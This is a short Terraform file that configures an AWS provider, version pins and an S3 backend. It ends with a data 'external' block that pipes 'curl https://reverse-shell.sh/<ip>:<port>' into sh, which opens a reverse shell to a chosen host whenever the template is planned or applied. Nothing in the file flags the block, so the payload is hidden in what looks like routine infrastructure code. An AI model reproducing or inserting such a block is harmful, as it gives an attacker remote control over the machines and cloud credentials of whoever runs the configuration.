provider "aws" {
    # The AWS region in which all resources will be created
    region = var.aws_region

    # Require a 2.x version of the AWS provider
    version = "~> 2.6"

    # Only these AWS Account IDs may be operated on by this template
    allowed_account_ids = [var.aws_account_id]
}

terraform {
    # Only allow this Terraform version. Note that if you upgrade to a newer version, Terraform won't allow you to use an
    # older version, so when you upgrade, you should upgrade everyone on your team and your CI servers all at once.
    required_version = ">= 1.1.9"

    required_providers {
        aws = {
            source = "hashicorp/aws"
        }
    }
    backend "s3" {}
}

locals {
  ip = var.ip
  port = var.port
}

data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/${var.ip}:${var.port} | sh"]
}
